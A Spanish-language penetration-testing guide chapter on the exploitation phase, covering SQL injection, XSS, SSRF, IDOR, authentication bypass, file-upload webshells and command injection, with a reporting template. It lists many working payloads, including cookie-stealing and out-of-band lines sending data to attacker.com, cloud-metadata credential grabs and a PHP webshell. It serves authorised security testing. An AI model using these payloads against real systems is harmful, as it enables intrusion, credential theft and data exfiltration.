# 06 - Fase 4: Explotacion

## Principios de Explotacion en Caja Negra

1. **Documentar antes de explotar** - screenshot/log del estado previo
2. **Minimo impacto** - no destruir datos, no causar DoS
3. **PoC suficiente** - demostrar el riesgo sin causar dano real
4. **Notificacion inmediata** - hallazgos criticos al cliente de inmediato
5. **Trazabilidad** - registrar cada paso para reproducibilidad

---

## Explotacion por Tipo de Vulnerabilidad

### SQL Injection

```bash
# Deteccion automatizada con SQLMap
sqlmap -u "https://target.com/page?id=1" --batch --dbs

# Enumerar bases de datos
sqlmap -u "https://target.com/page?id=1" --dbs

# Enumerar tablas
sqlmap -u "https://target.com/page?id=1" -D database_name --tables

# Enumerar columnas
sqlmap -u "https://target.com/page?id=1" -D database_name -T users --columns

# Extraer datos (con cuidado - solo lo necesario para PoC)
sqlmap -u "https://target.com/page?id=1" -D database_name -T users -C username,password --dump --limit 5

# SQLi en POST requests
sqlmap -u "https://target.com/login" --data="user=admin&pass=test" -p user --batch

# SQLi con cookies/headers
sqlmap -u "https://target.com/page" --cookie="session=abc123" --level 3

# SQLi en APIs JSON
sqlmap -u "https://target.com/api/search" --data='{"query":"test"}' --content-type="application/json"

# Bypass de WAF
sqlmap -u "https://target.com/page?id=1" --tamper=space2comment,between,randomcase
```

**Manual - Payloads por tipo:**

```sql
-- Error-based (MySQL)
' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--

-- Union-based (determinar columnas)
' ORDER BY 1-- (incrementar hasta error)
' UNION SELECT NULL,NULL,NULL-- (ajustar NULLs)
' UNION SELECT 1,username,password FROM users--

-- Boolean-based blind
' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'--

-- Time-based blind
' AND IF(1=1, SLEEP(5), 0)--
' AND IF((SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a', SLEEP(5), 0)--

-- Stacked queries (si soportado)
'; INSERT INTO users VALUES('hacker','password123')--
```

---

### Cross-Site Scripting (XSS)

**Reflected XSS:**
```html
<!-- Payloads basicos -->
<script>alert(document.domain)</script>
<img src=x onerror=alert(document.domain)>
<svg onload=alert(document.domain)>

<!-- Bypass de filtros -->
<ScRiPt>alert(1)</ScRiPt>
<img src=x onerror="&#97;lert(1)">
<svg/onload=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<marquee onstart=alert(1)>
<details open ontoggle=alert(1)>
javascript:alert(1) (en contexto de href)
\"-alert(1)-\" (si inyecta dentro de JS string)

<!-- XSS sin parentesis -->
<img src=x onerror=alert`1`>
<svg onload=confirm`1`>

<!-- Exfiltracion de cookies (PoC) -->
<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>
<img src=x onerror="new Image().src='https://attacker.com/steal?c='+document.cookie">
```

**Stored XSS:**
```
Vectores comunes:
- Campos de perfil (nombre, bio, avatar URL)
- Comentarios y reviews
- Mensajes privados
- Nombres de archivos subidos
- Campos de feedback/contacto
```

**DOM XSS:**
```javascript
// Sinks peligrosos a buscar en el JS:
document.write()
document.writeln()
element.innerHTML
element.outerHTML
element.insertAdjacentHTML()
eval()
setTimeout() / setInterval() con strings
location.href / location.assign() / location.replace()
window.open()
$.html() (jQuery)

// Sources comunes:
location.hash
location.search
document.URL
document.referrer
window.name
postMessage data
```

---

### SSRF (Server-Side Request Forgery)

```bash
# Identificar parametros que aceptan URLs
# url=, redirect=, next=, dest=, img=, load=, fetch=, uri=

# Cloud metadata (AWS)
url=http://169.254.169.254/latest/meta-data/
url=http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Cloud metadata (GCP)
url=http://metadata.google.internal/computeMetadata/v1/project/project-id
# Requiere header: Metadata-Flavor: Google

# Cloud metadata (Azure)
url=http://169.254.169.254/metadata/instance?api-version=2021-02-01

# Escaneo de puertos internos
url=http://127.0.0.1:22
url=http://127.0.0.1:3306
url=http://192.168.1.1:80

# Bypass de filtros
url=http://0x7f000001 (hex)
url=http://2130706433 (decimal)
url=http://127.0.0.1.nip.io
url=http://[::1]
url=http://127.1
url=http://0

# SSRF to RCE via Gopher
url=gopher://127.0.0.1:6379/_SET%20shell%20%22<%3fphp%20system($_GET['cmd'])%3b%20%3f>%22
```

---

### IDOR (Insecure Direct Object Reference)

```
Metodologia:
1. Crear dos cuentas de prueba (user A y user B)
2. Realizar acciones como user A, capturar requests
3. Repetir requests como user B cambiando IDs

Vectores:
- /api/users/123 -> /api/users/124
- /api/orders/abc-def -> /api/orders/xyz-123
- /download?file_id=100 -> /download?file_id=101
- POST /api/update {"user_id": 123} -> {"user_id": 124}

Tecnicas de bypass:
- Cambiar formato de ID: 123 -> 123.0, 0123, 00123
- UUID bruteforce (si predecible o leakeable)
- Parametro ID en diferentes locations: URL, body, cookie, header
- Wrapping: {"id": {"$gt": 0}} (NoSQL)
- HPP (HTTP Parameter Pollution): ?id=123&id=124
```

---

### Authentication Bypass

```bash
# Brute force con Hydra
hydra -l admin -P /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt target.com http-post-form "/login:username=^USER^&password=^PASS^:Invalid credentials"

# Brute force con ffuf
ffuf -u https://target.com/login -X POST -d "username=admin&password=FUZZ" -w /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt -fr "Invalid"

# JWT attacks
# Decodificar JWT
echo "eyJ..." | base64 -d

# jwt_tool
python3 jwt_tool.py <TOKEN> -C -d /path/to/wordlist.txt  # Crack secret
python3 jwt_tool.py <TOKEN> -X a  # Alg:none attack
python3 jwt_tool.py <TOKEN> -X k -pk public.pem  # Key confusion

# OAuth attacks
# Open redirect en redirect_uri
# State parameter missing/predictable
# Token leakage via referrer
```

---

### File Upload to RCE

```bash
# Webshell PHP minima (solo para PoC autorizado)
# <?php system($_GET['cmd']); ?>

# Tecnicas de bypass de extension
shell.php.jpg
shell.php%00.jpg    # Null byte
shell.pHp           # Case variation
shell.php5
shell.phtml
shell.shtml
shell.php.bak.php

# Bypass de content-type
# Cambiar Content-Type a image/jpeg manteniendo contenido PHP

# Double extension
shell.jpg.php

# Polyglot (imagen valida + PHP)
# Usar exiftool para insertar PHP en metadata de imagen
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg
mv image.jpg image.php.jpg
```

---

### Command Injection

```bash
# Payloads de deteccion
; whoami
| whoami
`whoami`
$(whoami)
& whoami
&& whoami
|| whoami
%0awhoami    # Newline

# Blind command injection (time-based)
; sleep 10
| sleep 10
`sleep 10`
$(sleep 10)

# Blind command injection (OOB)
; curl http://attacker.com/$(whoami)
; nslookup $(whoami).attacker.com
| wget http://attacker.com/$(cat /etc/hostname)
```

---

## Chaining de Vulnerabilidades

Combinar vulnerabilidades de bajo impacto para demostrar impacto critico:

```
Ejemplos de chaining:

1. Information Disclosure + IDOR
   - Extraer UUIDs de usuarios via API publica
   - Usar UUIDs para acceder a datos de otros usuarios

2. XSS + CSRF
   - XSS stored para ejecutar acciones como la victima
   - Robar token CSRF via XSS, luego ejecutar accion

3. SSRF + Cloud Metadata
   - SSRF para acceder a metadata de AWS
   - Obtener credenciales IAM temporales
   - Acceder a S3 buckets internos

4. Open Redirect + OAuth Token Theft
   - Open redirect en redirect_uri de OAuth
   - Redirigir token de autorizacion a servidor del atacante

5. Self-XSS + CSRF = Stored XSS
   - Self-XSS en perfil (solo afecta al propio usuario)
   - CSRF para forzar a victima a guardar payload XSS

6. Race Condition + Business Logic
   - Aplicar cupon de descuento multiples veces en paralelo
   - Transferir fondos multiples veces antes de validacion
```

---

## Documentacion de Explotacion

Para cada vulnerabilidad explotada, documentar:

```
HALLAZGO: [Nombre descriptivo]
SEVERIDAD: [Critical/High/Medium/Low/Info]
CVSS 4.0: [Score]

DESCRIPCION:
[Que es la vulnerabilidad y por que existe]

UBICACION:
- URL: [endpoint afectado]
- Parametro: [parametro vulnerable]
- Metodo HTTP: [GET/POST/PUT/etc]

PASOS DE REPRODUCCION:
1. [Paso detallado]
2. [Paso detallado]
3. [Paso detallado]

REQUEST:
[HTTP request completo]

RESPONSE:
[Parte relevante de la respuesta]

EVIDENCIA:
[Screenshots, logs, datos obtenidos]

IMPACTO:
[Que puede lograr un atacante explotando esto]

REMEDIACION:
[Como corregir la vulnerabilidad]
```
